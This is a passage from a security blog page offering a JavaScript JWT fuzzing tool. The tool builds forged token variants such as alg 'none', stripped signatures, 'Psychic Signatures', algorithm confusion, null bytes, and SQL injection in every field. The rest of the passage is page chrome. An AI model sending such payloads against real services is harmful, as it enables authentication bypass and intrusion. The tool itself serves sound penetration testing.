body, null)); /* Remove Signature */ payloads.push("$$@@Remove Signature@@$$"); payloads.push(joinComponents({...header}, body, null)); /* Empty Header */ payloads.push("$$@@Empty Header@@$$"); payloads.push(joinComponents({}, body, signature)); /* Empty Payload */ payloads.push("$$@@Empty Payload@@$$"); payloads.push(joinComponents(header, {}, signature)); if (generateAllPayloads === 'true') { let headerListSqlPayloads = []; let bodyListSqlPayloads = []; tempHeader = JSON.parse(JSON.stringify(header)); tempBody = JSON.parse(JSON.stringify(body)); traverseObject(tempHeader, tempHeader, headerListSqlPayloads, SQL_AND_BAD_TYPES_PAYLOADS); traverseObject(tempBody, tempBody, bodyListSqlPayloads, SQL_AND_BAD_TYPES_PAYLOADS); payloads.push("$$@@All Header fields SQL Injection & Bad Types@@$$"); headerListSqlPayloads.forEach(headerPayload => { payloads.push(joinComponents(headerPayload, body, signature)); }); payloads.push("$$@@All Body fields SQL Injection & Bad Types@@$$"); bodyListSqlPayloads.forEach(bodyPayload => { payloads.push(joinComponents(header, bodyPayload, signature)); }); } return payloads; } function joinComponents(header, body, signature) { let finalHeader = JSON.stringify(header).replace('"__REPLACE__THIS__1__"', LARGE_DIGIT_STRING).replace('"__REPLACE__THIS__2__"', HUGE_DIGIT_STRING); let finalBody = JSON.stringify(body).replace('"__REPLACE__THIS__1__"', LARGE_DIGIT_STRING).replace('"__REPLACE__THIS__2__"', HUGE_DIGIT_STRING); let finalJWT = [btoa(finalHeader).replace(/\=/g, ''), btoa(finalBody).replace(/\=/g, '')]; if(signature) { finalJWT.push(signature.trim()); } return finalJWT.join('.'); } function getTimeDifference(dateObj, compareDate) { if (!compareDate) compareDate = new Date(); let seconds = 0; let minutes = 0; let hours = 0; /* Difference in seconds */ let difference = Math.abs(dateObj.getTime() - compareDate.getTime()) / 1000.0; if(difference < 1) return `0 seconds`; if(difference < 2) return `1 second`; if(difference < 60) return `${Math.floor(difference)} seconds`; seconds = Math.floor(difference % 60); seconds = `${seconds} second${seconds===1 ? '' : 's'}`; /* Difference in minutes */ difference /= 60; if(difference < 2) return `1 minute, ${seconds}`; if(difference < 60) return `${Math.floor(difference)} minutes, ${seconds}`; minutes = Math.floor(difference % 60); minutes = `${minutes} minute${minutes===1 ? '' : 's'}`; /* Difference in hours */ difference /= 60; if(difference < 2) return `1 hour, ${minutes}, ${seconds}`; if(difference < 24) return `${Math.floor(difference)} hours, ${minutes}, ${seconds}`; hours = Math.floor(difference % 24); hours = `${hours} hour${hours===1 ? '' : 's'}`; /* Difference in days */ difference /= 24; if(difference < 2) return `1 day, ${hours}, ${minutes}, ${seconds}`; return `${Math.floor(difference)} days, ${hours}, ${minutes}, ${seconds}`; } function getJwtFromFields() { let jwt = {}; try { jwt.header = JSON.parse(document.getElementById('jwtHeader').value); } catch (err) { return "ERROR: Failed to Encode JWT Header as JSON"; } try { jwt.payload = JSON.parse(document.getElementById('jwtBody').value); } catch (err) { return "ERROR: Failed to Encode JWT Payload as JSON"; } try { jwt.signature = document.getElementById('jwtSignature').value; if (!jwt.signature) throw new Error(''); } catch (err) { return "ERROR: JWT Signature is Empty"; } return jwt; } function checkIfJwt(jwtString) { try { if(!jwtString) return 'empty'; let splitToken = jwtString.split('.'); let jwtHeader; let jwtBody; if(splitToken.length !== 3) return `JWT must contains 3 parts. Provided token contains ${splitToken.length} part${splitToken.length === 1 ? '' : 's'}`; try { atob(splitToken[0]) } catch (err) { return `JWT Header is not a valid base64 string` } try { atob(splitToken[1]) } catch (err) { return `JWT Payload is not a valid base64 string` } try { jwtHeader = JSON.parse(atob(splitToken[0])) } catch (err) { return `JWT Header is not a valid Object` } try { jwtBody = JSON.parse(atob(splitToken[1])) } catch (err) { return `JWT Payload is not a valid Object` } if(!splitToken[2]) return `JWT does not contain a Signature`; /* All checks passed */ return false; } catch (err) { return 'Processing of the JWT caused an unexpected error'; } }; function updateSessionInfo() { try { let jwt = getJwtFromFields(); if (typeof(jwt) === 'string' && jwt === 'ERROR: Failed to Encode JWT Payload as JSON') { throw new Error(jwt); } else { /* If the error wasn't with the JWT Payload, attempt to continue */ jwt = {}; jwt.payload = JSON.parse(document.getElementById('jwtBody').value); } let iatTime; if (jwt.payload.iat) { iatTime = new Date(jwt.payload.iat*1000); } else if (jwt.payload.nbf) { iatTime = new Date(jwt.payload.nbf*1000); } else { iatTime = new Date({}); } let expTime = new Date(jwt.payload.exp*1000); /* Show the IssueAt time on-screen */ document.getElementById('jwtSessionTime').innerText = `${Math.round((expTime - iatTime)/1000)} seconds (${getTimeDifference(iatTime, expTime)})`; /* Show the IssueAt time on-screen */ document.getElementById('jwtIssuedAt').innerText = `JWT was issued at ${(iatTime).toLocaleString()}`; /* Show the Expiration time on-screen */ if(expTime > new Date()) { document.getElementById('jwtExpiresAt1').innerText = `valid`; document.getElementById('jwtExpiresAt1').style.color = `LawnGreen`; document.getElementById('jwtExpiresAt2').innerText = ` and expires at ${(expTime).toLocaleString()} (in ${getTimeDifference(expTime)})`; } else { document.getElementById('jwtExpiresAt1').innerText = `not valid`; document.getElementById('jwtExpiresAt1').style.color = `Red`; document.getElementById('jwtExpiresAt2').innerText = ` and expired at ${(expTime).toLocaleString()} (${getTimeDifference(expTime)} ago)`; } document.getElementById('sessionInfo').style.display = 'block'; } catch (err) { document.getElementById('sessionInfo').style.display = 'none'; document.getElementById('jwtIssuedAt').innerText = ''; document.getElementById('jwtExpiresAt1').innerText = ''; document.getElementById('jwtExpiresAt2').innerText = ''; } } function createPayloads() { try { let jwt = getJwtFromFields(); if (typeof(jwt) === 'string' && jwt.startsWith('ERROR: ')) { throw new Error(jwt); } document.getElementById('secondaryBlock').style.display = 'block'; /* Display the suggested payloads */ let suggestedPayloadsListContainer = document.getElementById('suggestedPayloads'); suggestedPayloadsListContainer.innerHTML = ''; let suggestPayloads = [ 'Algorithm \'none\'', 'Algorithm \'none\' & Remove Signature', 'Psychic Signatures', 'Null Byte Injection', 'Invalid Header Base64', 'Invalid Payload Base64', 'Invalid Header JSON', 'Invalid Payload JSON', 'Invalid Algorithm with Bad Strings', 'Invalid Signature', 'Invalid Signature with Bad Strings', `Modify IssuedAt/NotBefore (iat/nbf) & Expiration (exp)`, 'Remove Algorithm', 'Remove Type', 'Remove Signature', 'Empty Header', 'Empty Payload' ]; if (jwt.header.hasOwnProperty('alg') && (jwt.header.alg.startsWith('HS') || jwt.header.alg.startsWith('RS') || jwt.header.alg.startsWith('ES') || jwt.header.alg.startsWith('PS'))) { suggestPayloads.push('Modify Algorithm (RS256 -> HS256, HS256 -> RS256, RS256 -> RS512, etc)'); suggestPayloads.push('Modify Algorithm & Remove Signature'); } if (generateAllPayloads === 'true') { suggestPayloads.push('All Header fields SQL Injection'); suggestPayloads.push('All Header fields Bad Types'); suggestPayloads.push('All Body fields SQL Injection'); suggestPayloads.push('All Body fields Bad Types'); } /* Add the suggested payloads to the unordered list */ suggestPayloads.forEach(suggestedPayload => { let childElement = document.createElement('li'); childElement.innerText = suggestedPayload; suggestedPayloadsListContainer.appendChild(childElement); }); let payloadListContainer = document.getElementById('payloadList'); /* Clear the div of Unordered Lists */ payloadListContainer.innerHTML = ''; let totalSuggestPayloads = 0; let listsToAdd = []; let currentList = null; /* If the JWT has been edited, so the edited JWT as well in the payload list */ if (joinComponents(jwt.header, jwt.payload, jwt.signature) !== document.getElementById('jwtPayload').value.trim().replace(/-/g, '+').replace(/_/g, '/')) { let title = document.createElement('h5'); title.innerText = 'Edited JWT'; listsToAdd.push(title); currentList = document.createElement('ui'); currentList.style.display = 'block'; currentList.style['padding-left'] = '40px'; let childElement = document.createElement('li'); if (showDecodedJwts) { let splitPieces = joinComponents(jwt.header, jwt.payload, jwt.signature).split('.'); try { splitPieces[0] = atob(splitPieces[0]); } catch (err) { splitPieces[0] = "Failed-To-Decode-Header" } try { splitPieces[1] = atob(splitPieces[1]); } catch (err) { splitPieces[1] = "Failed-To-Decode-Payload" } childElement.innerText = splitPieces.join('.'); } else { childElement.innerText = joinComponents(jwt.header, jwt.payload, jwt.signature); } currentList.appendChild(childElement); totalSuggestPayloads++; } /* Generate the JWT payloads */ let results = generatePayloads(jwt.header, jwt.payload, jwt.signature); /* Add all the output payloads to the unordered list */ results.forEach(outputPayload => { if (outputPayload.startsWith('$$@@') && outputPayload.endsWith('@@$$')) { if (currentList) listsToAdd.push(currentList); currentList = document.createElement('ui'); currentList.style.display = 'block'; currentList.style['padding-left'] = '40px'; let title = document.createElement('h5'); title.innerText = outputPayload.replace('$$@@', '').replace('@@$$', ''); listsToAdd.push(title); } else { /* Correct way of updating text instead of raw concatenation and setting innerHTML. Because XSS is bad. */ let childElement = document.createElement('li'); if (showDecodedJwts) { let splitPieces = outputPayload.split('.'); try { splitPieces[0] = atob(splitPieces[0]); } catch (err) { splitPieces[0] = "Failed-To-Decode-Header" } try { splitPieces[1] = atob(splitPieces[1]); } catch (err) { splitPieces[1] = "Failed-To-Decode-Payload" } childElement.innerText = splitPieces.join('.'); } else { childElement.innerText = outputPayload; } currentList.appendChild(childElement); totalSuggestPayloads++; } }); /* Add the final Unordered List */ if (currentList) listsToAdd.push(currentList); listsToAdd = listsToAdd.filter((element, index) => { /* If this element is a list, and is empty, don't include it */ if (element.tagName === 'UI' && Object.keys(element.children).length === 0) return false; /* If this element is a title, and the next element is an empty list, don't include this title */ if (element.tagName === 'H5' && Object.keys(listsToAdd[index+1].children).length === 0) return false; return true; }); /* Add the Unordered Lists to the jwt payloads div. */ listsToAdd.forEach(suggestedPayloadGroup => { payloadListContainer.appendChild(suggestedPayloadGroup); }); /* Update the field telling the user how many payloads there are */ document.getElementById('totalPayloads').innerText = `Total JWT Payloads: ${totalSuggestPayloads}`; document.getElementById('jwtFieldsError').innerText = ''; } catch (err) { /* Show error saying Header/Payload is not a valid JSON */ document.getElementById('jwtFieldsError').innerText = err.message; document.getElementById('secondaryBlock').style.display = 'none'; } } function jwtTokenChanged() { try { let jwt = document.getElementById('jwtPayload').value.replace(/-/g, '+').replace(/_/g, '/'); let storeToken = window.sessionStorage.getItem('storeJwtToken') || null; /* Only temp store the token if the allowed */ if(storeToken === 'true') { window.sessionStorage.setItem('jwtPayload', (jwt || '')); } let isIssuesWithJwt = checkIfJwt(jwt); if(!isIssuesWithJwt) { let jwtObj = { header: JSON.parse(atob(jwt.split('.')[0].replace(/-/g, '+').replace(/_/g, '/'))), body: JSON.parse(atob(jwt.split('.')[1].replace(/-/g, '+').replace(/_/g, '/'))), signature: jwt.split('.')[2] }; let stringHeader = JSON.stringify(jwtObj.header, null, 2); let stringBody = JSON.stringify(jwtObj.body, null, 2); document.getElementById('mainBlock').style.display = 'block'; document.getElementById('errorsWithJwt').innerText = ``; document.getElementById('jwtHeader').value = stringHeader; document.getElementById('jwtHeader').rows = (stringHeader.match(/\n/g) || []).length + 1; document.getElementById('jwtBody').value = stringBody; document.getElementById('jwtBody').rows = (stringBody.match(/\n/g) || []).length + 1; document.getElementById('jwtSignature').value = jwtObj.signature; /* Only store data if the option has been enabled */ if ((window.sessionStorage.getItem('storeJwtToken') || null) === 'true') { window.sessionStorage.setItem('jwtFieldHeader', document.getElementById('jwtHeader').value); window.sessionStorage.setItem('jwtFieldPayload', document.getElementById('jwtBody').value); window.sessionStorage.setItem('jwtFieldSignature', document.getElementById('jwtSignature').value); } updateSessionInfo(); createPayloads(); } else { if(isIssuesWithJwt === 'empty') { document.getElementById('errorsWithJwt').innerText = ``; } else { document.getElementById('errorsWithJwt').innerText = `ERROR: ${isIssuesWithJwt}`; } document.getElementById('jwtHeader').value = ''; document.getElementById('jwtBody').value = ''; document.getElementById('jwtSignature').value = ''; window.sessionStorage.removeItem('jwtFieldHeader'); window.sessionStorage.removeItem('jwtFieldPayload'); window.sessionStorage.removeItem('jwtFieldSignature'); document.getElementById('jwtSessionTime').innerText = ``; document.getElementById('jwtIssuedAt').innerText = ``; document.getElementById('suggestedPayloads').innerHTML = ''; document.getElementById('payloadList').innerHTML = ''; document.getElementById('totalPayloads').innerText = `Total Payloads: 0`; document.getElementById('mainBlock').style.display = 'none'; } } catch (err) {} } function jwtFieldEdited(fieldChanged) { let storeToken = window.sessionStorage.getItem('storeJwtToken') || null; let valueToSave; if(storeToken === 'true') { if(fieldChanged === 'jwtFieldHeader') { valueToSave = document.getElementById('jwtHeader').value.replace(/-/g, '+').replace(/_/g, '/'); } else if (fieldChanged === 'jwtFieldPayload') { valueToSave = document.getElementById('jwtBody').value.replace(/-/g, '+').replace(/_/g, '/'); } else if (fieldChanged === 'jwtFieldSignature') { valueToSave = document.getElementById('jwtSignature').value; } window.sessionStorage.setItem(fieldChanged, valueToSave); } createPayloads(); } function copyAllToClipboard(includedDecodedPayloads) { let tokensToCopy = []; /* Create a list of the payloads */ Object.values(document.getElementById('payloadList').children).forEach(child => { /* Only copy the list elements, not the headings */ if (child.tagName === 'UI') { Object.values(child.children).forEach(listChild => { tokensToCopy.push(listChild.innerText); }); } }); /* Remove Duplicates */ tokensToCopy = [...new Set(tokensToCopy)]; /* Copy the payloads to the clipboard */ navigator.clipboard.writeText(tokensToCopy.join('\n')); } /* Store the preference of whether to temp store the token or not */ function radioChange(newValue) { if(newValue) { window.sessionStorage.setItem('storeJwtToken', 'true'); window.sessionStorage.setItem('jwtPayload', (document.getElementById('jwtPayload').value || '').trim()); window.sessionStorage.setItem('jwtFieldHeader', document.getElementById('jwtHeader').value.trim().replace(/-/g, '+').replace(/_/g, '/')); window.sessionStorage.setItem('jwtFieldPayload', document.getElementById('jwtBody').value.trim().replace(/-/g, '+').replace(/_/g, '/')); window.sessionStorage.setItem('jwtFieldSignature', document.getElementById('jwtSignature').value.trim()); } else { window.sessionStorage.setItem('storeJwtToken', 'false'); window.sessionStorage.removeItem('jwtPayload'); window.sessionStorage.removeItem('jwtFieldHeader'); window.sessionStorage.removeItem('jwtFieldPayload'); window.sessionStorage.removeItem('jwtFieldSignature'); } } /* Store the preference of whether to generate injection payloads or not */ function radioChangePayloads(newValue) { if(newValue) { window.sessionStorage.setItem('generateAllPayloads', 'true'); generateAllPayloads = 'true'; } else { window.sessionStorage.setItem('generateAllPayloads', 'false'); generateAllPayloads = 'false'; } jwtTokenChanged(); } let TEST_JWT_NAMES = "adrian,alex,alfred,alison,andrew,angela,anthony,ben,brenda,carol,caroline,christina,christine,christopher,clare,colin,craig,david,deborah,edward,elaine,gabrielle,geoffrey,helen,ian,james,jane,jill,john,judith,julie,karen,katherine,kelly,kevin,laura,lesley,lindsey,mark,martin,mary,matt,matthew,michael,michele,michelle,morty,patricia,paul,pauline,peter,phillip,rachael,richard,rick,ruth,sharon,shaun,sheila,simon,stephen,steven,stuart,suzanne,terence,thomas,trevor,william".split(','); let TEST_JWT_ROLES = "admin,manager,cloud-engineer,network-engineer,senior-consultant,consultant".split(','); let TEST_JWT_ALGS = "HS256,HS384,HS512,RS256,RS384,RS512,ES256,ES384,ES512,PS256,PS384,PS512".split(','); let TEST_JWT_VALID_FOR = [300, 600, 900, 1800, 2700, 3600, 7200]; let TEST_JWT_HEX_CHARS = '0123456789abcdef'.split(''); function generateTestJwt() { let header = { alg: TEST_JWT_ALGS[Math.floor(Math.random()*TEST_JWT_ALGS.length)], typ: 'JWT' }; /* 50% of the time add a 'kid' field to the Header */ if (Math.random() < 0.5) { header.kid = Math.floor(Math.random()*50000000 + 50000000); } let payload = { name: TEST_JWT_NAMES[Math.floor(Math.random()*TEST_JWT_NAMES.length)], role: TEST_JWT_ROLES[Math.floor(Math.random()*TEST_JWT_ROLES.length)], }; let creationTime = Math.floor((new Date()).getTime()/1000 - (Math.floor(Math.random()*1200))); let tokenValidFor = TEST_JWT_VALID_FOR[Math.floor(Math.random()*TEST_JWT_VALID_FOR.length)]; /* 50% of the time use IssuedAt (iat), other 50% use NotBefore (nbf) */ if (Math.random() < 0.5) { payload.iat = creationTime; } else { payload.nbf = creationTime; } /* Add the token expiration (exp) field */ payload.exp = creationTime + tokenValidFor; /* 50% of the time add a 'token-id' field to the Body */ if (Math.random() < 0.5) { payload['token-id'] = []; for (let i = 0; i < 8; ++i) { payload['token-id'].push(TEST_JWT_HEX_CHARS[Math.floor(Math.random()*TEST_JWT_HEX_CHARS.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 4; ++i) { payload['token-id'].push(TEST_JWT_HEX_CHARS[Math.floor(Math.random()*TEST_JWT_HEX_CHARS.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 4; ++i) { payload['token-id'].push(TEST_JWT_HEX_CHARS[Math.floor(Math.random()*TEST_JWT_HEX_CHARS.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 4; ++i) { payload['token-id'].push(TEST_JWT_HEX_CHARS[Math.floor(Math.random()*TEST_JWT_HEX_CHARS.length)]); } payload['token-id'].push('-'); for (let i = 0; i < 8; ++i) { payload['token-id'].push(TEST_JWT_HEX_CHARS[Math.floor(Math.random()*TEST_JWT_HEX_CHARS.length)]); } payload['token-id'] = payload['token-id'].join(''); } let signature = []; let signatureSize = parseInt(header.alg.match(/\d{3}/)[0]) / 4; for (let i = 0; i < signatureSize; ++i) { signature.push(TEST_JWT_HEX_CHARS[Math.floor(Math.random()*TEST_JWT_HEX_CHARS.length)]); } signature = signature.join('').match(/../g).map(x => String.fromCharCode(parseInt(x, 16))).join(''); signature = btoa(signature).replace(/\=/g, ''); let finalJwt = btoa(JSON.stringify(header)).replace(/\=/g, '') + '.' + btoa(JSON.stringify(payload)).replace(/\=/g, '') + '.' + signature; document.getElementById('jwtPayload').value = finalJwt; jwtTokenChanged(); } function clearJwt() { document.getElementById('jwtPayload').value = ''; jwtTokenChanged(); } /* Get saved preference of whether to temp store the token */ let storeJwtToken = window.sessionStorage.getItem('storeJwtToken') || null; generateAllPayloads = window.sessionStorage.getItem('generateAllPayloads') || 'true'; if (generateAllPayloads === 'true') { document.getElementById('genPayloads').checked = true; } else { document.getElementById('doNotGenPayloads').checked = true; } /* Set the initial state of whether to temp store the token or not */ if(storeJwtToken === 'true') { document.getElementById('storeJwtToken').checked = true; } else if(storeJwtToken === 'false') { document.getElementById('doNotStoreJwtToken').checked = true; window.sessionStorage.removeItem('jwtPayload'); window.sessionStorage.removeItem('jwtFieldHeader'); window.sessionStorage.removeItem('jwtFieldPayload'); window.sessionStorage.removeItem('jwtFieldSignature'); } else { document.getElementById('storeJwtToken').checked = true; window.sessionStorage.setItem('storeJwtToken', true); } /* Check if there is a token in session storage */ let savedJwtTokenData = (window.sessionStorage.getItem('jwtPayload') || '').toString(); /* Update the text area with the value if there is a stored token */ if(storeJwtToken === 'true' && savedJwtTokenData) { document.getElementById('jwtPayload').value = savedJwtTokenData; document.getElementById('mainBlock').style.display = 'block'; document.getElementById('jwtHeader').value = (window.sessionStorage.getItem('jwtFieldHeader') || '').toString().replace(/-/g, '+').replace(/_/g, '/'); document.getElementById('jwtHeader').rows = (document.getElementById('jwtHeader').value.match(/\n/g) || []).length + 1; document.getElementById('jwtBody').value = (window.sessionStorage.getItem('jwtFieldPayload') || '').toString().replace(/-/g, '+').replace(/_/g, '/'); document.getElementById('jwtBody').rows = (document.getElementById('jwtBody').value.match(/\n/g) || []).length + 1; document.getElementById('jwtSignature').value = (window.sessionStorage.getItem('jwtFieldSignature') || '').toString(); createPayloads(); } else { jwtTokenChanged(); } setInterval(updateSessionInfo, 500); </script></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href='/categories/tools/'>tools</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/tools/" class="post-tag no-text-decoration" >tools</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/http/" class="post-tag no-text-decoration" >http</a> <a href="/tags/https/" class="post-tag no-text-decoration" >https</a> <a href="/tags/jwt/" class="post-tag no-text-decoration" >jwt</a> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >cryptography</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted me-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=JWT%20Fuzzing%20-%20Node%20Security&url=%2Fposts%2Fjwt-fuzzing%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter" > <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=JWT%20Fuzzing%20-%20Node%20Security&u=%2Fposts%2Fjwt-fuzzing%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook" > <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fjwt-fuzzing%2F&text=JWT%20Fuzzing%20-%20Node%20Security" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram" > <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/rust-cheatsheet/">Rust Cheatsheet</a><li class="text-truncate lh-lg"> <a href="/posts/extract-ntlm-hashes-via-linux-live-boot/">Extract NTLM Hashes via Linux Live Boot</a><li class="text-truncate lh-lg"> <a href="/posts/admin-to-system-with-psexec/">Admin to SYSTEM with PsExec</a><li class="text-truncate lh-lg"> <a href="/posts/user-dumping-with-msol/">User Dumping with MSOL</a><li class="text-truncate lh-lg"> <a href="/posts/windows-uac-privilege-escalation/">Windows UAC Privilege Escalation</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/javascript/">javascript</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a> <a class="post-tag btn btn-outline-primary" href="/tags/http/">http</a> <a class="post-tag btn btn-outline-primary" href="/tags/https/">https</a> <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a> <a class="post-tag btn btn-outline-primary" href="/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">nodejs</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a></div></div></div><div id="toc-wrapper" class="ps-0 pe-4 mb-5"><div class="panel-heading ps-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-3 pe-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ms-1" data-toc-skip> Further Reading</h3><div class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><div class="col"> <a href="/posts/certificate-generation-pure-nodejs/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1632146870" data-df="ll" > Sep 21, 2021 </em><h4 class="pt-0 my-2" data-toc-skip>Certificate Generate Pure NodeJS</h4><div class="text-muted small"><p> This post will show example code of how to generate a Certificate Authority and Host Certificates (signed by the CA we generate) using NodeJS without using OpenSSL. This will be done using the node...</p></div></div></a></div><div class="col"> <a href="/posts/api-fuzzing/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1623314587" data-df="ll" > Jun 10, 2021 </em><h4 class="pt-0 my-2" data-toc-skip>API Fuzzing</h4><div class="text-muted small"><p> PAGE UNDER CONSTRUCTION Fuzzing Payloads CR-LF Copy “CR-LF” Payloads to Clipboard Bad Strings Copy “Bad Strings” Payloads to Clipboard JSON Parameter Fuzzing - Small Copy “JSON Parameter Fuzzi...</p></div></div></a></div><div class="col"> <a href="/posts/web-app-checklist/" class="card post-preview h-100"><div class="card-body"> <em class="small" data-ts="1633295642" data-df="ll" > Oct 4, 2021 </em><h4 class="pt-0 my-2" data-toc-skip>Web App Checklist</h4><div class="text-muted small"><p> This page is an interactive tool of this page. All the data for this checklist application is STORED CLIENT-SIDE. This application works by storing data in localStorage so that it’s persistent betw...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ssh-server-hardening/" class="btn btn-outline-primary" prompt="Older" ><p>SSH Server Hardening</p></a> <a href="/posts/filter-and-map/" class="btn btn-outline-primary" prompt="Newer" ><p>Filter and Map</p></a></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/javascript/">javascript</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a> <a class="post-tag btn btn-outline-primary" href="/tags/http/">http</a> <a class="post-tag btn btn-outline-primary" href="/tags/https/">https</a> <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a> <a class="post-tag btn btn-outline-primary" href="/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">nodejs</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><footer><div class="container px-lg-4"><div class="d-flex justify-content-center align-items-center text-muted mx-md-3"><p>Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a></p><p>© 2024 <a href="https://twitter.com/todo">Alexander Wells</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div></div></footer><div id="mask"></div><button id="back-to-top" aria-label="back-to-top" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.7/dayjs.min.js,npm/dayjs@1.11.7/locale/en.min.js,npm/dayjs@1.11.7/plugin/relativeTime.min.js,npm/dayjs@1.11.7/plugin/localizedFormat.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
